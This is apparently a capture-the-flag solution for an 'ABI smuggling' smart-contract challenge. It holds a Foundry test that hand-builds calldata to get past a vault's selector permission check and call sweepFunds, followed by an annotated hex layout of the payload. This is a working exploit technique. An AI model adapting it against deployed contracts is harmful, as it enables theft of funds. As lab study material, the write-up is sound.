# ABI SMUGGLING

```solidity
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 executeSelector = vault.execute.selector;
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12), // Withdraw function selector
            bytes28(0) // 28 zero bytes to fill the 32-byte slot
        );
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        bytes memory actionDataLength = abi.encodePacked(
            uint256(actionDataLengthValue)
        );
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector, // 4 bytes
            target, // 32 bytes
            dataOffset, // 32 bytes
            emptyData, // 32 bytes
            withdrawSelectorPadded, // 32 bytes (starts at the 100th byte)
            actionDataLength, // Length of actionData
            sweepFundsCalldata // The actual calldata to `sweepFunds()`
        );

        bytes memory _temp = abi.encodePacked(
            emptyData,
            withdrawSelectorPadded
        );

        console.log(uint256(actionDataLengthValue));
        console.logBytes(actionDataLength);
        console.log(_temp.length);
        console.logBytes(abi.encodePacked(_temp.length));
        console.log(uint256(0x80));
        // console.logBytes(abi.encodePacked(abi.encodePacked(uint256(0)), abi.encodePacked(withdrawSelector, bytes28(0))));
        // console.logBytes(executeCallData);

        // bytes4 withdrawSelector = vault.withdraw.selector;
        // bytes4 executeSelector = AuthorizedExecutor.execute.selector;

        // bytes memory actionCallData = abi.encodeWithSelector(
        //     vault.sweepFunds.selector,
        //     recovery,
        //     token
        // );

        // bytes memory executeCallData = abi.encodePacked(
        //     executeSelector,
        //     bytes32(abi.encodePacked(bytes12(0), bytes20(address(vault)))),
        //     abi.encodePacked(uint256(0x4A)), // bytes32 (offset where `actionCallData` starts)
        //     abi.encodePacked(uint256(0)), // bytes32 (padding or zero-filled byte)
        //     abi.encodePacked(withdrawSelector, bytes28(0)), // bytes4 (selector for `withdraw`)
        //     abi.encodePacked(uint256(actionCallData.length)),
        //     actionCallData
        // );

        (bool success, bytes memory returnData) = address(vault).call(
            calldataPayload
        );

        if (!success) {
            // If the call failed, we try to retrieve the revert reason from returnData
            if (returnData.length > 0) {
                // If the return data contains a revert reason, revert with it
                string memory revertReason = abi.decode(returnData, (string));
                revert(revertReason);
            } else {
                // Otherwise, revert with a generic message
                revert("Call failed");
            }
        }
    }
```

```sh
0x1cff79cd # 4bit signature  
0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264 # 32 byte address
0000000000000000000000000000000000000000000000000000000000000080 # 32 byte offset (128 = 0x80)
0000000000000000000000000000000000000000000000000000000000000000 # 32 byte 0s
d9caed1200000000000000000000000000000000000000000000000000000000 #  4 byte sig + 28bit padding
0000000000000000000000000000000000000000000000000000000000000044 # 32 byte length (0x44 == 68)
85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b # calldata
```


#### What learned ?

- calldata layout